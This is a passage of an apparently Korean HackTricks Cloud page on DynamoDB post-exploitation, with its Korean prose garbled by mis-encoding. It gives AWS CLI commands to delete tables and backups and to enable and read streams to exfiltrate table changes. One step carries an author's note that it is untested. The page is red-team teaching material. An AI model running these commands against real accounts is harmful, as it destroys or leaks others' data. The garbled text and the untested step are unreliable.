**ì ì¬ì ì¸ ì˜í–¥:** DynamoDB í…Œì´ë¸”ì— ë°ì´í„°ë¥¼ ì¶”ê°€/ìˆ˜ì •í•˜ì—¬ ì¶”ê°€ì ì¸ ì·¨ì•½ì /ìš°íšŒë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŒ

### `dynamodb:DeleteTable`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” DynamoDB í…Œì´ë¸”ì„ ì‚­ì œí•˜ì—¬ ë°ì´í„° ì†ì‹¤ì„ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```

**ì ì¬ì  ì˜í–¥**: ì‚­ì œëœ í…Œì´ë¸”ì— ì˜ì¡´í•˜ëŠ” ì„œë¹„ìŠ¤ì˜ ë°ì´í„° ì†ì‹¤ ë° ì¤‘ë‹¨.

### `dynamodb:DeleteBackup`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” DynamoDB ë°±ì—…ì„ ì‚­ì œí•  ìˆ˜ ìˆìœ¼ë©°, ì¬í•´ ë³µêµ¬ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ë°ì´í„° ì†ì‹¤ì„ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```

**ì ì¬ì  ì˜í–¥**: ì¬í•´ ë³µêµ¬ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ë°ì´í„° ì†ì‹¤ ë° ë°±ì—…ì—ì„œ ë³µêµ¬í•  ìˆ˜ ì—†ìŒ.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: ì´ê²Œ ì‹¤ì œë¡œ ì‘ë™í•˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸í•´ë³´ì„¸ìš”.
{% endhint %}

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” DynamoDB í…Œì´ë¸”ì— ìŠ¤íŠ¸ë¦¼ì„ í™œì„±í™”í•˜ê³ , í…Œì´ë¸”ì„ ì—…ë°ì´íŠ¸í•˜ì—¬ ë³€ê²½ ì‚¬í•­ì„ ìŠ¤íŠ¸ë¦¬ë°í•˜ë©°, ìŠ¤íŠ¸ë¦¼ì— ì•¡ì„¸ìŠ¤í•˜ì—¬ í…Œì´ë¸”ì˜ ë³€ê²½ ì‚¬í•­ì„ ì‹¤ì‹œê°„ìœ¼ë¡œ ëª¨ë‹ˆí„°ë§í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¡œ ì¸í•´ ê³µê²©ìëŠ” ë°ì´í„° ë³€ê²½ ì‚¬í•­ì„ ëª¨ë‹ˆí„°ë§í•˜ê³  ìœ ì¶œí•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì ì¬ì ìœ¼ë¡œ ë°ì´í„° ìœ ì¶œë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

1. DynamoDB í…Œì´ë¸”ì— ìŠ¤íŠ¸ë¦¼ í™œì„±í™”í•˜ê¸°:

```bash
bashCopy codeaws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```

2. ARN ë° ê¸°íƒ€ ì„¸ë¶€ ì •ë³´ë¥¼ ì–»ê¸° ìœ„í•œ ìŠ¤íŠ¸ë¦¼ ì„¤ëª…:

```bash
bashCopy codeaws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```

3. ìŠ¤íŠ¸ë¦¼ ARNì„ ì‚¬ìš©í•˜ì—¬ ìƒ¤ë“œ ì´í„°ë ˆì´í„°ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤:

```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```

4. ìƒ¤ë“œ ì´í„°ë ˆì´í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ ìŠ¤íŠ¸ë¦¼ì—ì„œ ë°ì´í„°ì— ì ‘ê·¼í•˜ê³  ìœ ì¶œí•©ë‹ˆë‹¤:

```bash
bashCopy codeaws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```

**ì ì¬ì  ì˜í–¥**: DynamoDB í…Œì´ë¸”ì˜ ë³€ê²½ ì‚¬í•­ì˜ ì‹¤ì‹œê°„ ëª¨ë‹ˆí„°ë§ ë° ë°ì´í„° ìœ ì¶œ.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
